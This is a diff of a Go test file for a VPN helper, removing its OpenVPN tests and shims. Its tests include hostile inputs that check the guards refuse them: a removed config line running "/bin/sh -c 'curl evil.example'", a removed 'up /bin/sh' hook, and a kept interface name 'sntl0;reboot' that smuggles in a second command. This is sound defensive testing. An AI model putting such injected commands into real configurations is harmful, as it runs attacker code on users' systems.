@@ -45,7 +45,6 @@ type fakeEnv struct {
 	warns   []string
 	wgtype  bool
 	rules   map[string]int
-	ovpnOK  bool
 	nextPid int
 	// foreignWg are wireguard-type links belonging to ANOTHER VPN (Mullvad, IVPN,
 	// a hand-rolled tunnel). detectOtherVpn warns about these rather than blocking,
@@ -70,7 +69,7 @@ type fakeEnv struct {
 func newFake(t *testing.T) *fakeEnv {
 	t.Helper()
 	root := t.TempDir()
-	f := &fakeEnv{t: t, root: root, rules: map[string]int{}, ovpnOK: true, nextPid: 31337,
+	f := &fakeEnv{t: t, root: root, rules: map[string]int{}, nextPid: 31337,
 		nftTables: map[string]bool{}, iptSave: map[string]string{}, restoreStdin: map[string]string{}}
 	f.Env = &Env{
 		Run:        f.run,
@@ -87,7 +86,7 @@ func newFake(t *testing.T) *fakeEnv {
 			t.Fatal(err)
 		}
 	}
-	for _, b := range []string{"usr/local/bin/katacomb-vpn-helper", "usr/sbin/openvpn"} {
+	for _, b := range []string{"usr/local/bin/katacomb-vpn-helper"} {
 		if err := os.WriteFile(filepath.Join(root, b), []byte("#!/bin/sh\n"), 0o755); err != nil {
 			t.Fatal(err)
 		}
@@ -221,41 +220,9 @@ func (f *fakeEnv) run(_ context.Context, argv []string, opt RunOpt) ([]byte, []b
 	case "iptables-restore", "ip6tables-restore":
 		f.restoreStdin[filepath.Base(argv[0])] = string(opt.Stdin)
 		return nil, nil, nil
-	case "openvpn":
-		var pidFile, logFile string
-		for i := 0; i+1 < len(a); i++ {
-			switch a[i] {
-			case "--writepid":
-				pidFile = a[i+1]
-			case "--log":
-				logFile = a[i+1]
-			}
-		}
-		_ = os.WriteFile(pidFile, []byte("4242\n"), 0o644)
-		if f.ovpnOK {
-			_ = os.WriteFile(logFile, []byte(ovpnOKLog), 0o644)
-			f.addLink("sntl-ovpn")
-		} else {
-			_ = os.WriteFile(logFile, []byte(ovpnFailLog), 0o644)
-		}
-		return nil, nil, nil
 	}
 	return nil, nil, nil
 }
-
-// Identical to the shim's log texts, so the .state snapshots compare.
-const (
-	ovpnOKLog = "TCP/UDP: Preserving recently used remote address: [AF_INET]203.0.113.10:1194\n" +
-		"TUN/TAP device sntl-ovpn opened\n" +
-		"Initialization Sequence Completed\n"
-	ovpnFailLog = "TCP/UDP: Preserving recently used remote address: [AF_INET]203.0.113.10:1194\n" +
-		"UDP link local: (not bound)\n" +
-		"UDP link remote: [AF_INET]203.0.113.10:1194\n" +
-		"TLS Error: TLS key negotiation failed to occur within 10 seconds (check your network connectivity)\n" +
-		"TLS Error: TLS handshake failed\n" +
-		"SIGUSR1[soft,tls-error] received, process restarting\n" +
-		"Restart pause, 1 second(s)\n"
-)
 
 func (f *fakeEnv) spawn(argv []string, _ RunOpt) (int, error) {
 	f.cmds = append(f.cmds, append([]string(nil), argv...))
@@ -271,9 +238,6 @@ func (f *fakeEnv) spawn(argv []string, _ RunOpt) (int, error) {
 
 func (f *fakeEnv) kill(pid int, sig syscall.Signal) error {
 	f.kills = append(f.kills, fmt.Sprintf("%d:%d", pid, sig))
-	if pid == 4242 { // the shim's fake openvpn pid: no such process
-		return syscall.ESRCH
-	}
 	return nil
 }
 
@@ -293,8 +257,6 @@ func normalise(argv []string, root string) []string {
 		switch {
 		case strings.HasSuffix(tok, "/sntl0.conf"):
 			tok = "<sntl0.conf>"
-		case strings.HasSuffix(tok, "/openvpn.conf"):
-			tok = "<openvpn.conf>"
 		}
 		out = append(out, tok)
 	}
@@ -521,9 +483,8 @@ func diffLines(want, got []string) string {
 // --- the replay ----------------------------------------------------------------
 
 var (
-	cfgWG   = mustRead("../guard/testdata/corpus/wireguard/clean.conf")
-	cfgAWG  = mustRead("../guard/testdata/corpus/amneziawg/clean.conf")
-	cfgOVPN = mustRead("../guard/testdata/corpus/openvpn/clean.conf")
+	cfgWG  = mustRead("../guard/testdata/corpus/wireguard/clean.conf")
+	cfgAWG = mustRead("../guard/testdata/corpus/amneziawg/clean.conf")
 )
 
 func mustRead(p string) []byte {
@@ -610,17 +571,7 @@ func TestTranscriptParity(t *testing.T) {
 	// awg-up / awg-down: not replayed against the bash helper. Since Phase 3 the
 	// device is embedded and the verb is a behavioural reimplementation of
 	// wg-quick(8); its command sequence is asserted in amneziawg_ops_test.go.
-	step("13-ovpn-up", func() error { return OpenVpnUp(ctx, f.Env, cfgOVPN) })
-	step("14-ovpn-down", func() error { return OpenVpnDown(ctx, f.Env) })
-	if !strings.Contains(strings.Join(f.takeKills(), ","), "4242:15") {
-		t.Errorf("ovpn-down must SIGTERM the pid in openvpn.pid")
-	}
-	f.ovpnOK = false
-	step("15-ovpn-up-timeout", func() error { return OpenVpnUp(ctx, f.Env, cfgOVPN) })
-	f.ovpnOK = true
-	if f.hasLink("sntl-ovpn") {
-		t.Fatal("the timeout branch must delete the link")
-	}
+	// 13-15 and 36 (ovpn-up/ovpn-down) are gone with OpenVPN (removed in 1.19.0).
 	step("16-tun-up", tunUp())
 	pid16 := f.nextPid
 	step("17-tun-down", func() error { return TunDown(ctx, f.Env) })
@@ -648,11 +599,11 @@ func TestTranscriptParity(t *testing.T) {
 		}
 	}
 	plantProc(pid20, self, "katacomb-vpn-helper", "_tun2socks", "-device", "tun://sntl-tun", "-proxy", "socks5://127.0.0.1:1080")
-	plantProc(777, filepath.Join(f.root, "usr/sbin/openvpn"), "openvpn", "_tun2socks", "tun://sntl-tun") // wrong executable
-	plantProc(778, self, "katacomb-vpn-helper", "_tun2socks", "-device", "--note=tun://sntl-tun")        // substring, not a whole entry
-	plantProc(779, self, "katacomb-vpn-helper", "daemon", "tun://sntl-tun")                              // our binary, not the sub-mode
-	plantProc(780, filepath.Join(f.root, "usr/sbin/openvpn"), "bash", "-c", "echo tun://sntl-tun")       // what pkill -f matched
-	plantProc(781, self+" (deleted)", "katacomb-vpn-helper", "_tun2socks", "-device", "tun://sntl-tun")  // engine from before an upgrade
+	plantProc(777, filepath.Join(f.root, "usr/bin/sleep"), "sleep", "_tun2socks", "tun://sntl-tun")     // wrong executable
+	plantProc(778, self, "katacomb-vpn-helper", "_tun2socks", "-device", "--note=tun://sntl-tun")       // substring, not a whole entry
+	plantProc(779, self, "katacomb-vpn-helper", "daemon", "tun://sntl-tun")                             // our binary, not the sub-mode
+	plantProc(780, filepath.Join(f.root, "usr/bin/sleep"), "bash", "-c", "echo tun://sntl-tun")         // what pkill -f matched
+	plantProc(781, self+" (deleted)", "katacomb-vpn-helper", "_tun2socks", "-device", "tun://sntl-tun") // engine from before an upgrade
 	step("21-tun-down-nostate", func() error { return TunDown(ctx, f.Env) })
 	if k := strings.Join(f.takeKills(), ","); k != fmt.Sprintf("%d:15,781:15", pid20) {
 		t.Errorf("the pid-less fallback must kill exactly our own _tun2socks processes, got kills = %q", k)
@@ -676,8 +627,6 @@ func TestTranscriptParity(t *testing.T) {
 	// tun2socks path, and the engine is embedded now (the slot is ignored).
 	// 35-awg-up-missing-bin is gone with the trio: `<bindir>` is accepted and
 	// ignored now (amneziawg_ops_test.go asserts that), so there is nothing to refuse.
-	ovpnUp := []byte(strings.Replace(string(cfgOVPN), "nobind", "up /bin/sh", 1))
-	step("36-ovpn-up-script", func() error { return OpenVpnUp(ctx, f.Env, ovpnUp) })
 	step("37-killswitch-on-badiface", ks(KillswitchParams{Iface: "sntl0;reboot", RemoteHost: "203.0.113.7"}))
 	step("38-tun-up-badsocks", func() error {
 		_, err := TunUp(ctx, f.Env, TunUpParams{SocksAddr: "localhost:1080", RemoteHost: "203.0.113.7", Gateway: "192.168.1.1", Iface: "eth0"})
@@ -688,7 +637,7 @@ func TestTranscriptParity(t *testing.T) {
 	}
 }
 
-var guardRefusals = map[string]bool{"30-up-postup": true, "36-ovpn-up-script": true}
+var guardRefusals = map[string]bool{"30-up-postup": true}
 
 // The directories the verbs create are 0700, as ensure_run_dir / ensure_persist_dir made them.
 func TestStateDirsAre0700(t *testing.T) {
@@ -754,16 +703,16 @@ func TestStateChangingVerbsTakeTheLock(t *testing.T) {
 }
 
 // A missing Run-level Sleep would spin: the polls must call Sleep between tries.
-func TestOpenVpnPollWaitsBetweenTries(t *testing.T) {
+func TestTunPollWaitsBetweenTries(t *testing.T) {
 	f := newFake(t)
-	f.ovpnOK = false
+	f.Env.Spawn = func(argv []string, _ RunOpt) (int, error) { return 4321, nil } // never creates sntl-tun
 	sleeps := 0
 	f.Env.Sleep = func(time.Duration) { sleeps++ }
-	if err := OpenVpnUp(context.Background(), f.Env, cfgOVPN); err == nil {
+	if _, err := TunUp(context.Background(), f.Env, TunUpParams{SocksAddr: "127.0.0.1:1080", RemoteHost: "203.0.113.7", Gateway: "192.168.1.1", Iface: "eth0"}); err == nil {
 		t.Fatal("want the timeout error")
 	}
-	if sleeps != ovpnPollTries {
-		t.Fatalf("want %d sleeps, got %d", ovpnPollTries, sleeps)
+	if sleeps != tunPollTries {
+		t.Fatalf("want %d sleeps, got %d", tunPollTries, sleeps)
 	}
 }
 
@@ -791,9 +740,6 @@ func TestErrorsNeverEchoConfig(t *testing.T) {
 		t.Fatalf("got %v", err)
 	}
 	if err := AmneziaWgUp(context.Background(), f.Env, secret, "-"); err == nil || strings.Contains(err.Error(), "evil.example") {
-		t.Fatalf("got %v", err)
-	}
-	if err := OpenVpnUp(context.Background(), f.Env, []byte("client\nup /bin/sh -c 'curl evil.example'\n")); err == nil || strings.Contains(err.Error(), "evil.example") {
 		t.Fatalf("got %v", err)
 	}
 }
